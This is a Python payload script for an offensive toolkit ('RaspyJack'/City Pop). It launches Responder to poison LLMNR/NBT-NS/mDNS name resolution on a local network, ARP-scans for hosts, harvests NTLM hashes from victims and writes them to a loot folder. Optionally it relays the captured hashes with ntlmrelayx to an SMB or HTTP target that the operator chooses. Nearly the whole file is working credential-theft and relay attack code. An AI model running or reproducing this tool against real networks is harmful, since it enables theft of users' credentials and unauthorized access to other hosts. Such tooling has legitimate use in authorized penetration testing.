#!/usr/bin/env python3
# @name: NTLM Relay Attack
# @desc: Run City Pop's bundled Responder for LLMNR/NBT-NS/mDNS poisoning, collect NTLM hashes, and optionally attempt SMB or HTTP relay to an authorized host.
# @category: credentials
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- NTLM Relay Attack
========================================
Author: 7h30th3r0n3

Wrapper around the vendored Responder tool at $CITYPOP_ROOT/Responder/.
Captures NTLM hashes via poisoning and optionally relays them to a
target host.

Setup / Prerequisites:
  - Requires Responder installed at $CITYPOP_ROOT/Responder/.
  - Best results when run after ARP MITM or silent bridge setup.

Steps:
  1) Discover hosts on the local network via ARP scan
  2) User selects relay target and service type (SMB/HTTP)
  3) Start Responder to poison LLMNR/NBT-NS/mDNS
  4) Monitor Responder logs for captured hashes
  5) Attempt relay of captured hashes

Controls:
  python3 ntlm_relay.py [iface] [duration_seconds] [SMB|HTTP]

  iface             -- optional network interface. If omitted, the
                        default route interface is used.
  duration_seconds  -- optional time to run Responder before stopping
                        (default 60). Ctrl-C stops early.
  SMB|HTTP          -- optional relay service type (default SMB).

  Hosts on the local network are discovered via ARP scan and printed;
  you are then prompted to pick a relay target (or leave blank to
  skip relaying and just capture hashes). Captured hashes are printed
  as they are found and exported to loot when the run finishes.

Loot: $CITYPOP_ROOT/loot/NTLMRelay/
"""

from payloads._web_input import request_input
import os
import sys
import re
import json
import time
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'NTLMRelay')
os.makedirs(LOOT_DIR, exist_ok=True)

RESPONDER_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'Responder')
RESPONDER_SCRIPT = os.path.join(RESPONDER_DIR, "Responder.py")
RESPONDER_LOG_DIR = os.path.join(RESPONDER_DIR, "logs")
SERVICE_TYPES = ["SMB", "HTTP"]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
hosts = []              # list of dicts: {ip, mac}
status_msg = "Idle"
responder_running = False
captured_hashes = []    # list of dicts: {timestamp, type, user, hash, source}
relay_attempts = 0
relay_successes = 0

_responder_proc = None
_iface = None

# ---------------------------------------------------------------------------
# Interface detection
# ---------------------------------------------------------------------------

def _detect_default_iface():
    """Detect the default network interface for Responder."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                idx = parts.index("dev")
                if idx + 1 < len(parts):
                    return parts[idx + 1]
    except Exception:
        pass
    # Fallback to eth0
    return "eth0"


# ---------------------------------------------------------------------------
# ARP host discovery
# ---------------------------------------------------------------------------

def _arp_scan(iface):
    """Discover hosts on the local network via arp-scan or ARP table."""
    found = []

    # Try arp-scan first
    try:
        result = subprocess.run(
            ["sudo", "arp-scan", "-I", iface, "--localnet", "-q"],
            capture_output=True, text=True, timeout=15,
        )
        for line in result.stdout.splitlines():
            parts = line.strip().split()
            if len(parts) >= 2:
                ip = parts[0]
                mac = parts[1]
                if re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                    found.append({"ip": ip, "mac": mac})
        if found:
            return found
    except Exception:
        pass

    # Fallback: read ARP table
    try:
        result = subprocess.run(
            ["ip", "neigh", "show"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.strip().split()
            if len(parts) >= 5 and parts[2] == "dev":
                ip = parts[0]
                mac = parts[4] if len(parts) > 4 else "??"
                if re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                    found.append({"ip": ip, "mac": mac})
    except Exception:
        pass

    return found


def do_arp_scan():
    """Discover hosts on the local network."""
    global hosts, status_msg
    iface = _iface or _detect_default_iface()
    with lock:
        status_msg = "Scanning network..."
    print(f"[*] ARP scanning on {iface}...", flush=True)
    found = _arp_scan(iface)
    with lock:
        hosts = found
        status_msg = f"Found {len(found)} hosts"


# ---------------------------------------------------------------------------
# Responder management
# ---------------------------------------------------------------------------

def _start_responder():
    """Start Responder in background."""
    global _responder_proc, responder_running, status_msg

    iface = _iface or _detect_default_iface()

    if not os.path.isfile(RESPONDER_SCRIPT):
        with lock:
            status_msg = "Responder not found!"
        print("[!] Responder not found at " + RESPONDER_SCRIPT, flush=True)
        return

    with lock:
        status_msg = "Starting Responder..."

    try:
        _responder_proc = subprocess.Popen(
            ["sudo", "python3", RESPONDER_SCRIPT, "-I", iface, "-wrf"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            cwd=RESPONDER_DIR,
        )
    except Exception as exc:
        with lock:
            status_msg = f"Err: {str(exc)[:18]}"
        print(f"[!] Failed to start Responder: {exc}", flush=True)
        return

    time.sleep(2)
    if _responder_proc.poll() is not None:
        stderr = ""
        try:
            stderr = _responder_proc.stderr.read().decode(errors="replace")[:200]
        except Exception:
            pass
        with lock:
            status_msg = f"Responder fail: {stderr[:16]}"
        print(f"[!] Responder exited immediately: {stderr}", flush=True)
        return

    with lock:
        responder_running = True
        status_msg = "Responder active"
    print(f"[*] Responder active on {iface}", flush=True)

    # Start hash monitoring thread
    threading.Thread(target=_monitor_hashes, daemon=True).start()


def _stop_responder():
    """Stop Responder."""
    global _responder_proc, responder_running, status_msg

    with lock:
        responder_running = False

    if _responder_proc is not None:
        try:
            _responder_proc.terminate()
            _responder_proc.wait(timeout=5)
        except Exception:
            try:
                _responder_proc.kill()
            except Exception:
                pass
        _responder_proc = None

    # Kill any remaining Responder processes
    subprocess.run(["sudo", "pkill", "-f", "Responder.py"],
                   capture_output=True, timeout=5)

    with lock:
        status_msg = "Responder stopped"
    print("[*] Responder stopped.", flush=True)


def _monitor_hashes():
    """Monitor Responder log directory for captured hashes."""
    global captured_hashes, status_msg

    seen_files = set()

    while True:
        with lock:
            if not responder_running:
                break

        try:
            if os.path.isdir(RESPONDER_LOG_DIR):
                for fname in os.listdir(RESPONDER_LOG_DIR):
                    fpath = os.path.join(RESPONDER_LOG_DIR, fname)
                    if fpath in seen_files:
                        continue
                    if not fname.endswith(".txt"):
                        continue

                    seen_files.add(fpath)
                    _parse_responder_log(fpath, fname)
        except Exception:
            pass

        time.sleep(2)


def _parse_responder_log(fpath, fname):
    """Parse a Responder log file for hashes."""
    global captured_hashes

    hash_type = "Unknown"
    if "NTLM" in fname.upper():
        hash_type = "NTLMv2" if "v2" in fname.lower() else "NTLMv1"
    elif "SMB" in fname.upper():
        hash_type = "SMB"
    elif "HTTP" in fname.upper():
        hash_type = "HTTP"

    try:
        with open(fpath, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # Typical Responder hash format: user::domain:challenge:hash:hash
                parts = line.split(":")
                user = parts[0] if parts else "unknown"
                entry = {
                    "timestamp": datetime.now().isoformat(),
                    "type": hash_type,
                    "user": user[:32],
                    "hash": line[:128],
                    "source": fname,
                }
                with lock:
                    # Avoid duplicates
                    existing_hashes = {h["hash"] for h in captured_hashes}
                    if line[:128] not in existing_hashes:
                        captured_hashes.append(entry)
                        print(f"[+] Hash captured: {entry['user']} ({entry['type']}) "
                              f"from {fname}", flush=True)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Relay attempt
# ---------------------------------------------------------------------------

def _attempt_relay(target_ip, service):
    """Attempt NTLM relay to target using captured hash."""
    global relay_attempts, relay_successes, status_msg

    with lock:
        if not captured_hashes:
            status_msg = "No hashes to relay"
            return
        relay_attempts += 1
        status_msg = f"Relaying to {target_ip}..."

    # Use ntlmrelayx if available, otherwise log attempt
    ntlmrelayx = "/usr/bin/ntlmrelayx.py"
    impacket_relay = "/usr/local/bin/ntlmrelayx.py"

    relay_bin = None
    for path in (ntlmrelayx, impacket_relay):
        if os.path.isfile(path):
            relay_bin = path
            break

    if relay_bin:
        try:
            proto = "smb" if service == "SMB" else "http"
            target_url = f"{proto}://{target_ip}"
            result = subprocess.run(
                ["sudo", "python3", relay_bin, "-t", target_url, "-smb2support"],
                capture_output=True, text=True, timeout=30,
            )
            if "success" in result.stdout.lower():
                with lock:
                    relay_successes += 1
                    status_msg = "Relay success!"
            else:
                with lock:
                    status_msg = "Relay: no success"
        except subprocess.TimeoutExpired:
            with lock:
                status_msg = "Relay timeout"
        except Exception as exc:
            with lock:
                status_msg = f"Relay err: {str(exc)[:14]}"
    else:
        with lock:
            status_msg = "ntlmrelayx not found"


# ---------------------------------------------------------------------------
# Export hashes
# ---------------------------------------------------------------------------

def export_hashes():
    """Export captured hashes to loot directory."""
    with lock:
        if not captured_hashes:
            return None
        data = list(captured_hashes)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"hashes_{ts}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

    # Also save raw hashes
    raw_path = os.path.join(LOOT_DIR, f"hashes_{ts}.txt")
    with open(raw_path, "w") as f:
        for entry in data:
            f.write(entry["hash"] + "\n")

    return path


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _iface

    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 ntlm_relay.py [iface] [duration_seconds] [SMB|HTTP]",
              flush=True)
        return 0

    args = sys.argv[1:]
    iface_arg = args[0] if len(args) > 0 else None
    duration_arg = args[1] if len(args) > 1 else None
    service_arg = args[2] if len(args) > 2 else None

    _iface = iface_arg or _detect_default_iface()
    print(f"[*] Using interface: {_iface}", flush=True)

    duration = 60
    if duration_arg:
        try:
            duration = max(1, int(duration_arg))
        except ValueError:
            print(f"[!] Invalid duration '{duration_arg}', using default 60s.", flush=True)

    service = SERVICE_TYPES[0]
    if service_arg:
        matches = [s for s in SERVICE_TYPES if s.lower() == service_arg.lower()]
        if matches:
            service = matches[0]
        else:
            print(f"[!] Unknown service '{service_arg}', using default SMB.", flush=True)

    do_arp_scan()
    with lock:
        host_list = list(hosts)

    if host_list:
        print(f"[*] Discovered {len(host_list)} host(s):", flush=True)
        for i, h in enumerate(host_list, 1):
            print(f"  {i}. {h['ip']}  {h['mac']}", flush=True)
    else:
        print("[!] No hosts discovered via ARP.", flush=True)

    target = None
    if host_list:
        choice = request_input(
            f"Select relay target [1-{len(host_list)}] (blank to skip relay): "
        ).strip()
        if choice:
            try:
                idx = int(choice) - 1
                if idx < 0 or idx >= len(host_list):
                    raise ValueError
                target = host_list[idx]["ip"]
            except ValueError:
                print("[!] Invalid selection, skipping relay.", flush=True)

    print(f"[*] Starting Responder for {duration}s (service={service})...", flush=True)
    _start_responder()

    try:
        start = time.time()
        last_report = 0
        while time.time() - start < duration:
            time.sleep(1)
            elapsed = int(time.time() - start)
            if elapsed - last_report >= 10:
                last_report = elapsed
                with lock:
                    hc = len(captured_hashes)
                print(f"[*] {elapsed}s elapsed, {hc} hash(es) captured...", flush=True)
    except KeyboardInterrupt:
        print("\n[*] Interrupted.", flush=True)
    finally:
        _stop_responder()

    with lock:
        hc = len(captured_hashes)
    print(f"[*] {hc} hash(es) captured total.", flush=True)

    if target:
        if hc > 0:
            print(f"[*] Attempting relay to {target} ({service})...", flush=True)
            _attempt_relay(target, service)
            with lock:
                print(f"[*] {status_msg}", flush=True)
        else:
            print("[*] No hashes captured, skipping relay attempt.", flush=True)

    path = export_hashes()
    if path:
        print(f"[*] Exported hashes to {path}", flush=True)
    else:
        print("[*] No hashes to export.", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
